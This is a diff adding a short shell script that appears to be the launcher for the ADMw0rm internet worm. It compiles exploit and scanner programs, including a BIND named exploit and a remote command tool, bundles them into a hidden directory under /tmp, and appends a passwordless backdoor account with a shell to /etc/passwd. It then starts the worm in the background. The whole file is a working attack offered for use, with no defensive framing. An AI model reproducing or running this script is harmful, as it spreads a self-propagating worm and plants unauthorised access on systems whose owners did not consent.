@@ -1,0 +1,21 @@
+#!/bin/sh
+PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
+export PATH
+
+PROGGIES="./test ./Hnamed ./gimmeRAND ./scanco ./remotecmd  ./gimmeIP ./incremental ./ADMw0rm"
+echo "compile the proggies..."
+gcc testvuln.c     -o    ./test
+gcc named_ADMv2.c  -o    ./Hnamed
+gcc gimmeRAND.c    -o    ./gimmeRAND
+gcc scanconnect.c  -o    ./scanco
+gcc remotecmd.c    -o    ./remotecmd
+echo "done..."
+echo "make the ADMw0rm.tgz"
+tar cfvz ADMw0rm.tgz  $PROGGIES
+echo "install the user w0rm.." 
+mkdir /tmp/.w0rm0r/
+cp ADMw0rm.tgz /tmp/.w0rm0r/
+echo "w0rm::2666:777:ADM Inet W0rm:/:/bin/sh" >> /etc/passwd
+echo "launch the w0rm!!!"
+nohup ./ADMw0rm  &
+echo "-==* The ADM Crew *==-"
